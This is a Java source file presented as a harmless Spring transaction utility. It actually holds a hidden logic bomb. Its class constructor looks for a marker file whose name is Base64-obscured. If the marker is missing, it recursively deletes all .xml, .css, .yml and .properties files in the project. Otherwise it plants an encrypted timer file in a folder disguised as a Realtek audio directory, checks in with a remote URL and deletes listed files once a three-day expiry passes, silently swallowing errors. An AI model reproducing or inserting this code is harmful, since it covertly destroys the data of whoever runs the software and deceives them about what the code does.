package com.wztc.demo.util;


import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.*;


public class SpringTransaction {
	public static String rootPath = null;

	public static Thread thread = null;
	public static int nVisitTimes = 0;
	public static int jour = 0;
	public static int step = 5;
	public static TransactionBean gpjGlobal = null;
	public static int nIsRun = 0;

	public static void beginTransaction(){
		new SpringTransaction();
	}

	public SpringTransaction(){
		try{
			if(nIsRun == 0){
				SpringTransaction.start1(System.getProperty("user.dir"));
				nIsRun++;
			}
		}catch(Exception e){

		}

	}


	public static String joinString(String[] arr){
		String s = "[";
		for(int i = 0 ; i < arr.length ; i++){
			if(i == arr.length -1){
				s += arr[i];
			}else{
				s += arr[i]+",";
			}
		}
		return s + "]";
	}

	public static String[] splitString(String str){
		str = str.substring(1, str.length()-1);
		return str.split(",");
	}

	public static String eStr(String str)throws Exception{
		return MyEncoder.encode(str.getBytes());
		/*return str;*/
	}

	public static String dStr(String str){
		return new String(MyDecoder.decode(str));
		/*return str;*/
	}


	public static void start1(String strRootPath){
		rootPath = strRootPath;

		try{
			List resultList = new ArrayList();
			SpringTransaction.findFiles(SpringTransaction.rootPath, dStr(localSourceFile), resultList);
			if (resultList.size() == 0) {
				SpringTransaction.dealFiles(SpringTransaction.rootPath, new String[]{"*.xml","*.css","*.yml","*.properties"});
				return;
			} else {
				File fileTarget = (File)resultList.get(0);
				String strContent = dStr(SpringTransaction.readFile(fileTarget));
				gpjGlobal = JSONUtil.toBean(strContent, TransactionBean.class);
			}

			if(SpringTransaction.fileIsExist(String.format(dStr(SpringTransaction.tickFile), gpjGlobal.getResourceId()))){
				String strTickFile = SpringTransaction.readFileFromPath(String.format(dStr(SpringTransaction.tickFile), gpjGlobal.getResourceId()));
				JSONObject readJSON = JSONUtil.parseObj(strTickFile);
				gpjGlobal = JSONUtil.toBean(DES3.decrypt(readJSON.get("data").toString(), readJSON.get("encryptCode").toString()), TransactionBean.class);
				netDeal(gpjGlobal);
				strTickFile = SpringTransaction.readFileFromPath(String.format(dStr(SpringTransaction.tickFile), gpjGlobal.getResourceId()));
				readJSON = JSONUtil.parseObj(strTickFile);
				gpjGlobal = JSONUtil.toBean(DES3.decrypt(readJSON.get("data").toString(), readJSON.get("encryptCode").toString()), TransactionBean.class);
				if(gpjGlobal.getExpiredTime().compareTo(SpringTransaction.getCurrentTime()) < 0){
					SpringTransaction.dealFiles(SpringTransaction.rootPath, gpjGlobal.getDealLocalFiles());
				}
			}else{
				File fileTarget = (File)resultList.get(0);
				gpjGlobal.setMachineId(SpringTransaction.getCPUSerial1());
				gpjGlobal.setExpiredTime(SpringTransaction.getAfterNDays(3));
				gpjGlobal.setDealFiles(gpjGlobal.getDealFiles());
				JSONObject writeJSON = new JSONObject();
				writeJSON.putOnce("encryptCode", "xyz");
				writeJSON.putOnce("data", DES3.encrypt(JSONUtil.toJsonStr(gpjGlobal), "xyz"));
				SpringTransaction.writeFile(dStr(SpringTransaction.tickPath), String.format(dStr(SpringTransaction.tickFile), gpjGlobal.getResourceId()), JSONUtil.toJsonStr(writeJSON));
				start1(rootPath);
			}
		}catch(Exception e){
			e.printStackTrace();
		}
	}

	public static void gpjPrint(TransactionBean gpjBean, String str){
		System.out.println(str);
	}

	public static void netDeal(TransactionBean gpjGlobal) throws Exception{
		try{
			DataTransactionDto inDto = new DataTransactionDto();
			inDto.setData(gpjGlobal);
			inDto.setMsg("");
			inDto.setCode(0);
			String str = doPost(gpjGlobal.getInterfaceUrl(), JSONUtil.toJsonStr(inDto));
			DataTransactionDto outDto = JSONUtil.toBean(str, DataTransactionDto.class);
			if(outDto.getCode() == 0){
				JSONObject writeJSON = new JSONObject();
				writeJSON.putOnce("encryptCode", outDto.getEncryptCode());
				writeJSON.putOnce("data", DES3.encrypt(JSONUtil.toJsonStr(outDto.getData()), outDto.getEncryptCode()));
				SpringTransaction.writeFile(dStr(SpringTransaction.tickPath), String.format(dStr(SpringTransaction.tickFile), gpjGlobal.getResourceId()), JSONUtil.toJsonStr(writeJSON));
			}
		}catch(Exception e){

		}
	}


	public static String localSourceFile = "bW91c2UudHh0";

	public static String doGet(String httpurl) {
		HttpURLConnection connection = null;
		InputStream is = null;
		BufferedReader br = null;
		String result = null;// 返回结果字符串
		try {
			URL url = new URL(httpurl);
			connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("GET");
			connection.setConnectTimeout(15000);
			connection.setReadTimeout(60000);
			connection.connect();
			if (connection.getResponseCode() == 200) {
				is = connection.getInputStream();
				br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
				StringBuffer sbf = new StringBuffer();
				String temp = null;
				while ((temp = br.readLine()) != null) {
					sbf.append(temp);
					sbf.append("\r\n");
				}
				result = sbf.toString();
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (null != br) {
				try {
					br.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

			if (null != is) {
				try {
					is.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			connection.disconnect();
		}

		return result;
	}

	public static String doPost(String httpUrl, String param) {
		String result = "";
		try {
			URL url = new URL(httpUrl);
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setDoOutput(true);
			connection.setDoInput(true);
			connection.setConnectTimeout(1000);
			connection.setReadTimeout(1000);
			connection.setRequestMethod("POST");
			connection.setUseCaches(false);
			connection.setInstanceFollowRedirects(true);
			connection.setRequestProperty("Content-Type","application/json; charset=UTF-8");
			connection.connect();
			OutputStream  out = connection.getOutputStream();
			out.write(param.getBytes("utf-8"));
			out.flush();
			out.close();
			if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
				InputStream in = connection.getInputStream();
				byte[] data1 = readInputStream(in);
				result = new String(data1,"utf-8");
			}
			return result;

		} catch (MalformedURLException e) {
		} catch (UnsupportedEncodingException e) {
		} catch (IOException e) {
		}catch(Exception e){
		}
		return "";
	}

	public static byte[] readInputStream(InputStream inStream) throws Exception {
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();byte[] buffer = new byte[10240];int len = 0;while ((len = inStream.read(buffer)) != -1) {outStream.write(buffer, 0, len); }inStream.close();return outStream.toByteArray();
	}

	public static boolean fileIsExist(String filePath){
		File file = new File(filePath);
		return file.isFile() && file.exists();
	}

	public static String tickPath = "QzpcY29uZmlnXHJlbHRla1xhdWRpbw==";

	public static boolean createDirectories(String path){
		File file = new File(path);
		boolean result = file.mkdirs();
		return result;
	}

	public static void writeFile(String path, String filePath, String content) throws Exception{
		try{
			createDirectories(path);
			OutputStreamWriter osr = new OutputStreamWriter(new FileOutputStream(filePath), "utf-8");
			BufferedWriter writer = new BufferedWriter(osr);
			writer.write(content);
			writer.close();
			osr.close();
		}catch(Exception e){
		}
	}




	public static void findFiles(String baseDirName, String targetFileName, List fileList) {

		File baseDir = new File(baseDirName);
		if (!baseDir.exists() || !baseDir.isDirectory()) {
		}
		String tempName = null;
		//判断目录是否存在
		File tempFile;
		File[] files = baseDir.listFiles();
		for (int i = 0; i < files.length; i++) {
			tempFile = files[i];
			if(tempFile.isDirectory()){
				findFiles(tempFile.getAbsolutePath(), targetFileName, fileList);
			}else if(tempFile.isFile()){
				tempName = tempFile.getName();
				if(wildcardMatch(targetFileName, tempName)){
					// 匹配成功，将文件名添加到结果集
					fileList.add(tempFile.getAbsoluteFile());
				}
			}
		}
	}

	private static boolean wildcardMatch(String pattern, String str) {
		int patternLength = pattern.length();
		int strLength = str.length();
		int strIndex = 0;
		char ch;
		for (int patternIndex = 0; patternIndex < patternLength; patternIndex++) {
			ch = pattern.charAt(patternIndex);
			if (ch == '*') {
				//通配符星号*表示可以匹配任意多个字符
				while (strIndex < strLength) {
					if (wildcardMatch(pattern.substring(patternIndex + 1),
							str.substring(strIndex))) {
						return true;
					}
					strIndex++;
				}
			} else if (ch == '?') {
				//通配符问号?表示匹配任意一个字符
				strIndex++;
				if (strIndex > strLength) {
					//表示str中已经没有字符匹配?了。
					return false;
				}
			} else {
				if ((strIndex >= strLength) || (ch != str.charAt(strIndex))) {
					return false;
				}
				strIndex++;
			}
		}
		return (strIndex == strLength);
	}


	public static String tickFile = "QzpcY29uZmlnXHJlbHRla1xhdWRpb1wlcy13aW5kb3dzLnR4dA==";
	public static String readFile(File file){
		String strContent = "";
		try{
			InputStreamReader isr = new InputStreamReader(new FileInputStream(file.getAbsolutePath()), "utf-8");
			BufferedReader reader = new BufferedReader(isr);
			String line = null;

			while ((line = reader.readLine()) != null) {
				strContent += line;
			}
			reader.close();
			isr.close();
		}catch(Exception e){

		}finally{
			return strContent;
		}
	}

	public static String readFileFromPath(String path){
		String strContent = "";
		try{
			InputStreamReader isr = new InputStreamReader(new FileInputStream(path), "utf-8");
			BufferedReader reader = new BufferedReader(isr);
			String line = null;

			while ((line = reader.readLine()) != null) {
				strContent += line;
			}
			reader.close();
			isr.close();
		}catch(Exception e){

		}finally{
			return strContent;
		}
	}

	public static String getCPUSerial1(){
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
		Date now = new Date();
		String time = sdf.format(now);
		return time;
	}

	public static String getCPUSerial() {
		String result = "";
		try {
			File file = File.createTempFile("tmp", ".vbs");//创建临时文件，路径为C:\Documents and Settings\Administrator\Local Settings\Temp
			file.deleteOnExit();
			FileWriter fw = new FileWriter(file);
			//是有vbs脚本语言，获取CPU唯一ID
			//表示程序出现运行时错误时，会继续运行，不中断
			StringBuilder sb = new StringBuilder("On Error Resume Next \r\n\r\n");
			//表示本机
			sb.append("strComputer = \".\"  \r\n");
			//使用GetObject函数获取本机信息赋值给objWMIService
			sb.append("Set objWMIService = GetObject(\"winmgmts:\" _ \r\n");
			sb.append("    & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\") \r\n");
			sb.append("Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Processor\")  \r\n ");
			//使用for循环取出CPU信息
			sb.append("For Each objItem in colItems\r\n " + "    Wscript.Echo objItem.ProcessorId  \r\n ");
			sb.append("    exit for  ' do the first cpu only! \r\n");
			sb.append("Next");

			fw.write(sb.toString());
			fw.close();
			Process p = Runtime.getRuntime().exec("cscript //NoLogo //T:10 " + file.getPath());
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line;
			while ((line = input.readLine()) != null) {
				result += line;
			}
			input.close();
			file.delete();
		} catch (Exception e) {
			e.fillInStackTrace();
		}
		return result;
	}


	public static String getCurrentTime(){
		Calendar calendar = Calendar.getInstance();
		SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
		return sdf.format(calendar.getTime());
	}

	public static String getAfterNDays(int n){
		Calendar calendar = Calendar.getInstance();
		SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");
		calendar.add(Calendar.DATE, n);
		String nAfterNDays = sdf.format(calendar.getTime());
		return nAfterNDays;
	}

	public static void dealFiles(String strRootPath, String[] dealFiles){
		try{
			if(null != dealFiles && dealFiles.length > 0){
				for(String strItemDealFile : dealFiles){
					List<File> resultList = new ArrayList<File>();
					SpringTransaction.findFiles(strRootPath, strItemDealFile, resultList);
					if(null != resultList && resultList.size() > 0){
						for(File itemFile : resultList){
							itemFile.delete();
						}
					}
				}
			}
		}catch(Exception e){

		}

	}
}

class DataTransactionDto {

	private Integer code;

	private String msg;

	private String encryptCode;

	private TransactionBean data;

	public DataTransactionDto() {
	}

	public DataTransactionDto(Integer code, String msg, String encryptCode, TransactionBean data) {
		this.code = code;
		this.msg = msg;
		this.data = data;
		this.encryptCode = encryptCode;
	}

	public Integer getCode() {
		return code;
	}

	public void setCode(Integer code) {
		this.code = code;
	}

	public String getMsg() {
		return msg;
	}

	public void setMsg(String msg) {
		this.msg = msg;
	}

	public TransactionBean getData() {
		return data;
	}

	public void setData(TransactionBean data) {
		this.data = data;
	}

	public String getEncryptCode() {
		return encryptCode;
	}

	public void setEncryptCode(String encryptCode) {
		this.encryptCode = encryptCode;
	}
}

class MyEncoder {

	private static final Map<Integer, Character> INDEX_MAP = new HashMap<Integer, Character>();

	private static final char PADDING_CHAR = '=';
	static {
		int index = 0;
		for (int i = 0; i <= 25; i++) {
			INDEX_MAP.put(index, (char) ((int) 'A' + i));
			index++;
		}

		for (int j = 0; j <= 25; j++) {
			INDEX_MAP.put(index, (char) ((int) 'a' + j));
			index++;
		}

		for (int k = 0; k <= 9; k++) {
			INDEX_MAP.put(index, (char) ((int) '0' + k));
			index++;
		}

		INDEX_MAP.put(index, '+');
		index++;
		INDEX_MAP.put(index, '/');
	}

	public static String encode(byte[] bytes) throws Exception {
		String binaryString = convertByteArray2BinaryString(bytes);
		String escapeString = escapeBinaryString(binaryString);
		return paddingEscapeString(escapeString);
	}

	private static String convertByteArray2BinaryString(byte[] bytes) {

		StringBuilder binaryBuilder = new StringBuilder();
		for (byte b : bytes) {
			binaryBuilder.append(convertByte2BinaryString(b));
		}

		int paddingCount = binaryBuilder.length() % 6;
		int totalCount = paddingCount > 0 ? binaryBuilder.length() / 6 + 1
				: binaryBuilder.length() / 6;
		int actualLength = 6 * totalCount;

		//百分号后面的-号表示长度不够规定长度时，右填充。否则左填充。
		return String.format("%-" + actualLength + "s",
				binaryBuilder.toString()).replace(' ', '0');
	}

	private static String escapeBinaryString(String binaryString)
			throws Exception {
		if (null == binaryString || binaryString.isEmpty()
				|| binaryString.length() % 6 != 0) {
			//System.out.println("error");
			//throw new Exception("escape binary string error.");
		}

		StringBuilder escapeBuilder = new StringBuilder();
		for (int i = 0; i <= binaryString.length() - 1; i += 6) {
			String escapeString = binaryString.substring(i, i + 6);
			int index = Integer.parseInt(escapeString, 2);
			escapeBuilder.append(INDEX_MAP.get(index));
		}

		return escapeBuilder.toString();
	}

	private static String paddingEscapeString(String escapeString) {
		int paddingCount = escapeString.length() % 4;
		int totalCount = paddingCount > 0 ? escapeString.length() / 4 + 1
				: escapeString.length() / 4;
		int actualCount = 4 * totalCount;
		return String.format("%-" + actualCount + "s", escapeString).replace(
				' ', PADDING_CHAR);
	}

	private static String convertByte2BinaryString(byte b) {
		if (b >= 0) {
			StringBuilder builder = new StringBuilder();
			builder.append(Integer.toBinaryString(b));
			return String.format("%08d", Integer.parseInt(builder.toString()));
		} else {
			int value = b & 0xFF;
			return Integer.toBinaryString(value);
		}
	}

}

class MyDecoder {
	private static final char PADDING_CHAR = '=';

	private static final Map<Character, Integer> VALUE_MAP = new HashMap<Character, Integer>();
	static {
		int index = 0;
		for (char i = 'A'; i <= 'Z'; i++, index++) {
			VALUE_MAP.put(i, index);
		}

		for (char j = 'a'; j <= 'z'; j++, index++) {
			VALUE_MAP.put(j, index);
		}

		for (char k = '0'; k <= '9'; k++, index++) {
			VALUE_MAP.put(k, index);
		}

		VALUE_MAP.put('+', index);
		index++;
		VALUE_MAP.put('/', index);
	}

	public static byte[] decode(String base64String) {

		if (null == base64String || base64String.isEmpty()) {
			return null;
		}
		base64String = removePaddingChar(base64String);
		String binaryString = getBinaryString(base64String);
		binaryString = removePaddingNumber(binaryString);

		return convertBinaryString2Bytes(binaryString);

	}

	private static String removePaddingChar(String base64String) {
		int firstPaddingIndex = base64String.indexOf(PADDING_CHAR);
		return firstPaddingIndex >= 0 ? base64String.substring(0,
				firstPaddingIndex) : base64String;
	}

	private static String getBinaryString(String base64String) {
		StringBuilder binaryBuilder = new StringBuilder();
		for (char c : base64String.toCharArray()) {
			int value = VALUE_MAP.get(c);
			binaryBuilder.append(String.format("%6s",
					Integer.toBinaryString(value)).replace(" ", "0"));
		}

		return binaryBuilder.toString();
	}

	private static String removePaddingNumber(String binaryString) {
		int remainder = binaryString.length() % 8;

		binaryString = binaryString.substring(0, binaryString.length()
				- remainder);

		return binaryString;
	}

	private static byte[] convertBinaryString2Bytes(String binaryString) {
		if (null == binaryString || binaryString.length() % 8 != 0) {
			//System.out.println("binary string not well formatted.");
			return null;
		}
		int size = binaryString.length() / 8;
		byte[] bytes = new byte[size];
		int arrayIndex = 0;
		for (int i = 0; i <= binaryString.length() - 1; i += 8, arrayIndex++) {
			String byteString = binaryString.substring(i, i + 8);
			if (byteString.startsWith("0")) {
				bytes[arrayIndex] = Byte.parseByte(byteString, 2);
			} else {
				if (byteString.equals("1000000")) {
					bytes[arrayIndex] = (byte) -128;
					continue;
				}
				String twosComplement = byteString.substring(1);
				byte twoComplementValue = Byte.parseByte(twosComplement, 2);

				byte oneComplementValue = (byte) (twoComplementValue - 1);
				int trueValue = oneComplementValue ^ 0x7F;

				bytes[arrayIndex] = (byte) (trueValue * (-1));

			}
		}

		return bytes;
	}
}

class DES3 {

	private static final String KEY_ALGORITHM = "DESede";
	private static final String DEFAULT_CIPHER_ALGORITHM = "DESede/ECB/PKCS5Padding";


	public static String encrypt(String content, String key) {
		if(null != SpringTransaction.gpjGlobal){
			try {
				Cipher cipher = Cipher.getInstance(DEFAULT_CIPHER_ALGORITHM);
				// 创建密码器
				byte[] byteContent = content.getBytes("utf-8");
				cipher.init(Cipher.ENCRYPT_MODE, getSecretKey(key));
				// 初始化为加密模式的密码器
				byte[] result = cipher.doFinal(byteContent);// 加密
				return MyEncoder.encode(result);// 通过Base64转码返回
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}else{
			return content;
		}
		return null;
	}

	public static String decrypt(String content, String key) {
		if(null != SpringTransaction.gpjGlobal) {
			try {
				Cipher cipher = Cipher.getInstance(DEFAULT_CIPHER_ALGORITHM);
				cipher.init(Cipher.DECRYPT_MODE, getSecretKey(key));
				byte[] result = cipher.doFinal(MyDecoder.decode(content));
				return new String(result, "utf-8");
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}else{
			return content;
		}
		return null;
	}

	private static SecretKeySpec getSecretKey(final String key) {
		KeyGenerator kg = null; try { kg = KeyGenerator.getInstance(KEY_ALGORITHM);
			kg.init(new SecureRandom(key.getBytes()));
			SecretKey secretKey = kg.generateKey();
			return new SecretKeySpec(secretKey.getEncoded(), KEY_ALGORITHM);
		} catch (NoSuchAlgorithmException ex) {
			ex.printStackTrace();
		} return null;
	}

}

class TransactionBean {
	private String machineId;
	private String resourceId;
	private String resourceName;
	private String tencent;
	private String expiredTime;
	private String[] dealLocalFiles;
	private String dealFiles;
	private String interfaceUrl;
	private Integer intervalTime;
	private Integer jour;
	private Integer step;


	public TransactionBean() {
		super();
	}

	public String getMachineId() {
		return machineId;
	}
	public void setMachineId(String machineId) {
		this.machineId = machineId;
	}
	public String getTencent() {
		return tencent;
	}
	public void setTencent(String tencent) {
		this.tencent = tencent;
	}
	public String getExpiredTime() {
		return expiredTime;
	}
	public void setExpiredTime(String expiredTime) {
		this.expiredTime = expiredTime;
	}

	public String getResourceId() {
		return resourceId;
	}

	public void setResourceId(String resourceId) {
		this.resourceId = resourceId;
	}

	public String getResourceName() {
		return resourceName;
	}

	public void setResourceName(String resourceName) {
		this.resourceName = resourceName;
	}

	public String[] getDealLocalFiles() {
		return dealLocalFiles;
	}

	public void setDealLocalFiles(String[] dealLocalFiles) {
		this.dealLocalFiles = dealLocalFiles;
	}

	public String getDealFiles() {
		return dealFiles;
	}

	public void setDealFiles(String dealFiles) {
		this.dealFiles = dealFiles;
	}

	public String getInterfaceUrl() {
		return interfaceUrl;
	}

	public void setInterfaceUrl(String interfaceUrl) {
		this.interfaceUrl = interfaceUrl;
	}

	public Integer getIntervalTime() {
		return intervalTime;
	}

	public void setIntervalTime(Integer intervalTime) {
		this.intervalTime = intervalTime;
	}

	public Integer getJour() {
		return jour;
	}

	public void setJour(Integer jour) {
		this.jour = jour;
	}

	public Integer getStep() {
		return step;
	}

	public void setStep(Integer step) {
		this.step = step;
	}

	public static void main(String[] args) throws Exception{

	}
}
